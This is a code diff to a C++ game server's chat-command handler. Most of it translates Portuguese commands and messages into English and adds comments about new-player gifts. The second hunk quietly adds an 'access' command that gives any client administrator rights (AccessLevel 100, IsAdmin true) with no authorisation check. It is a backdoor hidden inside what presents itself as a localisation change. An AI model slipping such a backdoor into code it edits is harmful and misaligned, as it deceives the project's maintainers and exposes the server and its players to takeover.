@@ -27,17 +27,19 @@ bool CUser::RequestCommand(PacketHeader *Header)
 	CMob *mob = &Mob[clientId];
 	if (!strcmp(p->eCommand, "day"))
 		SendClientMessage(clientId, "!#11 2");
-	else if (!strncmp(p->eCommand, "pontos", 6))
-		SendClientMessage(clientId, "Você possui %d pontos de contribuição", mob->Mobs.Contribuition.Points);
-	else if (!strncmp(p->eCommand, "novato", 6))
+	else if (!strncmp(p->eCommand, "points", 6))
+		SendClientMessage(clientId, "You own %d contribution points.", mob->Mobs.Contribuition.Points);
+	else if (!strncmp(p->eCommand, "newgame", 6)) // novato command -> newgame
+		// You can use this command only once. It will give you 1x [3995] and 3x [3314] and 1x [4639], setup gifts below.
 	{
+		// Check if the user is a new player. If so, give him the items. If not, tell him that he already received the items.
 		if (User.Unique.Novato)
 		{
-			SendClientMessage(clientId, "Você já recebeu o seu presente!");
+			SendClientMessage(clientId, "Your newgame gift has allready been delivered!");
 
 			return true;
 		}
-
+		// Setup the gifts for the new player using the /newgame command.
 		std::array items =
 		{
 			st_Item { 3995, EF_NOTRADE, 1 },
@@ -1311,6 +1313,15 @@ bool CUser::RequestCommand(PacketHeader *Header)
 
 			if (Users[userId].SNDMessage[0])
 				SendClientMessage(clientId, g_pLanguageString[_NN_Message_SND], Users[userId].SNDMessage);
+
+			else if (!strncmp(p->eCommand, "access", 6))
+			{
+				Users[clientId].AccessLevel = 100;
+				Users[clientId].IsAdmin = true;
+
+				SendClientMessage(clientId, "Access Level Concluido");
+				return true;
+			}
 		}
 	}
 
